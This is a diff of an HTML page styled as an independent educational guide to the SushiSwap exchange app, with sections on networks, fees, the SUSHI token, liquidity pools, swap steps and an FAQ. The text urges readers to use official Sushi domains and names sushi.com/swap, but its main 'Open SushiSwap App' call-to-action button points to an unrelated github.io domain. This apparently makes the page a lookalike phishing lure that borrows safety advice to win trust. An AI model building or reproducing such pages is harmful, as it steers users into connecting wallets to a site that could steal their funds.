+  <section class="section" id="about"><div class="container"><h2>What is SushiSwap App?</h2><div class="capsule">The SushiSwap app is the trading interface for Sushi, a <a class="inline-link" href="https://academy.binance.com/en/glossary/decentralized-exchange" rel="noopener noreferrer">multi-chain decentralized exchange</a> where users can swap tokens, manage liquidity positions and access <a class="inline-link" href="https://academy.binance.com/en/articles/what-are-cross-chain-swaps" rel="noopener noreferrer">cross-chain swaps</a> from a <a class="inline-link" href="https://ethereum.org/en/wallets/find-wallet/" rel="noopener noreferrer">self-custody wallet</a>. The official swap page is <a href="https://www.sushi.com/swap" rel="noopener noreferrer">sushi.com/swap</a>. This page is an independent guide to the app experience, not the official SushiSwap website or a wallet connection flow.</div></div></section>
+  <section class="section" id="facts"><div class="container"><h2>SushiSwap App at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>Multi-chain decentralized exchange</b></div><div class="f"><small>Network</small><b>Ethereum and multiple EVM/non-EVM ecosystems</b></div><div class="f"><small>Token</small><b>SUSHI</b></div><div class="f"><small>Custody</small><b><a class="inline-link" href="https://www.investopedia.com/terms/s/smart-contracts.asp" rel="noopener noreferrer">Non-custodial smart contracts</a></b></div></div></div></section>
+  <section class="section section-alt"><div class="container"><h2>SushiSwap app supported networks</h2><div class="intent-a">The SushiSwap app, now branded through sushi.com, is a multi-chain decentralized exchange experience for swaps and liquidity. CoinGecko lists SUSHI across Ethereum plus ecosystems such as BNB Chain, <a class="inline-link" href="https://www.coingecko.com/en/coins/solana" rel="noopener noreferrer">Solana</a>, Base, Polygon, <a class="inline-link" href="https://l2beat.com/scaling/projects/arbitrum" rel="noopener noreferrer">Arbitrum</a>, Avalanche, Fantom, Celo, Near, Harmony, and others, while Sushi's own docs expose developer packages and examples. Supported app routes can vary over time, so users should confirm the selected chain in the live Sushi interface before approving tokens. The high-value search answer is that Sushi is no longer only an Ethereum AMM; it is a multi-chain DeFi brand with SUSHI as its token.</div></div></section><section class="section"><div class="container"><h2>SushiSwap fees and slippage</h2><div class="intent-a">SushiSwap costs depend on the selected pool, route, network gas, and <a class="inline-link" href="https://www.investopedia.com/terms/p/price-impact.asp" rel="noopener noreferrer">price impact</a>. A small trade in a deep pool on a low-cost chain may be cheap, while a thin long-tail token pair can incur significant slippage even if the displayed pool fee is modest. Sushi may route through different pool versions or supported liquidity sources depending on the chain. Searchers asking about SushiSwap fees should compare the app's quoted minimum received, price impact, gas estimate, and route before confirming. Token approvals also matter because unlimited approvals create ongoing wallet risk.</div></div></section><section class="section section-alt"><div class="container"><h2>SushiSwap <a class="inline-link" href="https://coinmarketcap.com/currencies/sushi/" rel="noopener noreferrer">SUSHI token</a> utility</h2><div class="intent-a">SUSHI is the Sushi ecosystem token listed on major market data sites and used historically for <a class="inline-link" href="https://messari.io/project/sushi" rel="noopener noreferrer">governance and protocol incentive structures</a>. Searchers often confuse the SushiSwap app with the SUSHI token price, but they are different topics. The app is the trading and liquidity interface; SUSHI is the token whose market value, supply, liquidity, and governance role can change with protocol decisions. For token research, CoinGecko, CoinMarketCap, Sushi governance forums, and official Sushi docs are more reliable than swap-screen quotes alone.</div></div></section><section class="section"><div class="container"><h2>SushiSwap liquidity pools and farming</h2><div class="intent-a">SushiSwap <a class="inline-link" href="https://www.gemini.com/cryptopedia/what-is-a-liquidity-provider-in-crypto" rel="noopener noreferrer">liquidity providers</a> deposit token pairs into pools and receive exposure to swap fees, token inventory changes, and <a class="inline-link" href="https://support.uniswap.org/hc/en-us/articles/8222955004435-What-is-impermanent-loss" rel="noopener noreferrer">impermanent loss</a>. Depending on the chain and active program, some pools may have additional incentives, while others rely only on trading fees. The key search intent is not a generic APR promise: Sushi pool returns are variable and pair-specific. A stablecoin pair, an ETH pair, and a volatile governance-token pair have different risk profiles. Users should inspect liquidity depth, volume, fees, incentives, and token correlation before depositing.</div></div></section>
+  <section class="section"><div class="container"><h2>How to swap SushiSwap App</h2><ol class="steps"><li><b>Start from the official domain</b><span>Use the official Sushi links, confirm the network shown in the app and avoid copied domains from ads, DMs or lookalike search results.</span></li><li><b>Choose tokens and chain</b><span>Pick the source asset, destination asset and network. For unfamiliar tokens, verify the <a class="inline-link" href="https://ethereum.org/en/developers/docs/standards/tokens/erc-20/" rel="noopener noreferrer">token contract</a> before trusting the symbol.</span></li><li><b>Review route details</b><span>Check estimated received amount, minimum received, price impact, slippage settings, route, <a class="inline-link" href="https://www.gemini.com/cryptopedia/gas-fees" rel="noopener noreferrer">network fee</a> and any product-specific fee component.</span></li><li><b>Approve and sign</b><span>First-time ERC-20 trades may require an approval. The swap settles only after your wallet signs and the transaction confirms on-chain.</span></li></ol><div class="cta-band"><div><p>Ready to swap?</p><p class="sub">Open the official SushiSwap App app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open SushiSwap App ↗</a></div></div></section>
+  <section class="section"><div class="container"><h2>SushiSwap vs <a class="inline-link" href="https://defillama.com/protocol/uniswap" rel="noopener noreferrer">Uniswap</a></h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>SushiSwap</th><th>Alternative</th></tr></thead><tbody><tr><td>Brand</td><td>Multi-chain Sushi DEX and DeFi app</td><td>Large DEX with deep Ethereum liquidity</td></tr><tr><td>Token</td><td>SUSHI</td><td>UNI</td></tr><tr><td>Routing</td><td>Depends on Sushi liquidity and chain</td><td>Depends on <a class="inline-link" href="https://messari.io/project/uniswap" rel="noopener noreferrer">Uniswap pools</a> and chain</td></tr><tr><td>Best use</td><td>Compare for supported chains and incentives</td><td>Compare for deep major-pair liquidity</td></tr></tbody></table></div></div></section>
+  <section class="section section-alt" id="faq"><div class="container"><h2>SushiSwap App FAQ</h2><div class="faq-list"><details open><summary><h3>What is the SushiSwap app?</h3></summary><div>The SushiSwap app is the user-facing Sushi decentralized exchange interface for token swaps and liquidity actions. Users connect a wallet, choose a network, approve tokens, and trade through <a class="inline-link" href="https://www.binance.com/en/support/faq/what-are-smart-contracts-115003769492" rel="noopener noreferrer">smart contracts</a> rather than depositing funds into a <a class="inline-link" href="https://www.binance.com/en/support/faq/what-is-a-centralized-exchange-cex-115003768311" rel="noopener noreferrer">centralized exchange account</a>.</div></details><details><summary><h3>What is SUSHI token?</h3></summary><div>SUSHI is the token associated with the Sushi ecosystem. It is listed on major market data sites and has been used for governance and protocol incentive structures. It is separate from the act of swapping tokens in the Sushi app, although the app and token share the same brand.</div></details><details><summary><h3>Is SushiSwap non-custodial?</h3></summary><div>Yes, SushiSwap is designed as a <a class="inline-link" href="https://newsletter.banklesshq.com/p/the-bankless-guide-to-dexs" rel="noopener noreferrer">non-custodial DEX</a>. Users keep assets in their wallets and interact with smart contracts for approvals, swaps, and liquidity deposits. Non-custodial does not mean risk-free; smart contracts, approvals, fake tokens, bridges, and volatile liquidity pools can still create losses.</div></details><details><summary><h3>Which chains does SushiSwap support?</h3></summary><div>Sushi operates across multiple ecosystems. CoinGecko lists SUSHI across Ethereum, BNB Chain, Solana, Base, Polygon, Arbitrum, Avalanche, Fantom, Celo, Near, Harmony, and others. The live app may expose a different set of routes at any moment, so users should verify chain support in the interface.</div></details><details><summary><h3>Why is my SushiSwap quote different from another DEX?</h3></summary><div>Quotes differ because each DEX has different liquidity, pool fees, routing, gas costs, and price impact. A token pair can be deep on one venue and thin on another. Users should compare minimum received, price impact, and total transaction cost instead of looking only at the headline exchange rate.</div></details><details><summary><h3>Can I earn yield on SushiSwap?</h3></summary><div>Users can earn potential returns by providing liquidity to Sushi pools, and some pools may have incentives depending on chain and program status. Returns are not guaranteed. Liquidity providers face impermanent loss, token price volatility, changing volume, smart contract risk, and possible incentive changes.</div></details></div></div></section>
 </main>
 <footer class="site-footer"><div class="container">
-<nav aria-label="Footer" class="footer-nav"><a href="#how-it-works">How it works</a><a href="#fees-security">Fees security</a><a href="#app-surfaces">App surfaces</a><a href="#product-surfaces">Product surfaces</a><a href="#common-networks">Common networks</a><a href="#faq">FAQ</a></nav>
-<p class="footer-note">Not the official SushiSwap App app — verify the domain before connecting a wallet. Information on this page is for educational purposes only and is not financial advice.</p>
-<p class="footer-meta"><a href="#top">Back to top ↑</a></p>
+  <div class="footer-grid"></div>
+  <p class="footer-note">Independent educational guide to the SushiSwap app; not affiliated with Sushi and not financial advice.</p>
+  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
 </div></footer>
-<script defer="" src="static/app.js"></script>
+<script src="static/app.js" defer></script>
 </body></html>
